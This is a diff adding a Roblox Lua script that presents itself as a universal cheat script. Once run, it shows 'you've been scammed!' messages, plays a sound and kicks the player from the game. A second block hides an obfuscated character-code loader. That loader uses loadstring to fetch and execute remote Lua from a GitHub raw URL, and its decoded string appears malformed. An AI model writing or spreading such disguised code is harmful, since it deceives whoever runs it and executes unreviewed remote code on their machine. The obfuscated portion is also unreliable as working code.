@@ -1,0 +1,11 @@
+local a={4760592831,140242130183594,106786416076383}local b=0.1;local c=game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")local d=Instance.new("ScreenGui")d.Name="WarningMessages"d.Parent=c;local function e(f,g,h)local i=Instance.new("Frame")i.Size=UDim2.new(1,0,1,0)i.BackgroundTransparency=1;i.Parent=d;local j=Instance.new("TextLabel")j.Size=UDim2.new(1,0,0.5,0)j.Position=UDim2.new(0,0,0.25,0)j.BackgroundTransparency=1;j.Text=f;j.TextColor3=h or Color3.new(1,1,1)j.TextScaled=true;j.Font=Enum.Font.SourceSansBold;j.Parent=i;task.wait(g)i:Destroy()end;e("史上最全的通用脚本🤫",3,Color3.new(0,1,0))e("你被骗了！",1,Color3.new(1,0,0))local k=Instance.new("Sound")local l=function(m)return "rbxassetid://"..m end;k.SoundId=l(a[1])k.Parent=workspace;k:Play()task.wait(b)local n=game.Players.LocalPlayer;local o=function(p)n:Kick(p)end;o("我让你开挂😡")
+
+(function()
+    local q = string.char
+    local r = {102,117,110,99,116,105,111,110,40,41,10,9,108,111,99,97,108,32,115,32,61,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,65,115,121,110,99,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,82,111,98,108,111,120,83,99,114,105,112,116,80,114,111,116,101,99,116,111,114,47,77,97,105,110,47,83,111,117,114,99,101,46,108,117,97,34,41,41,40,41,10,9,115,46,80,114,111,116,101,99,116,40,103,97,109,101,46,80,108,97,121,101,114,115,46,76,111,99,97,108,80,108,97,121,101,114,46,80,108,97,121,101,114,83,99,114,105,112,116,115,46,87,97,114,110,105,110,103,77,101,115,115,97,103,101,115,41,10,101,110,100,41,40,41}
+    local t = ""
+    for u = 1, #r do
+        t = t .. q(r[u])
+    end
+    loadstring(t)()
+end)()
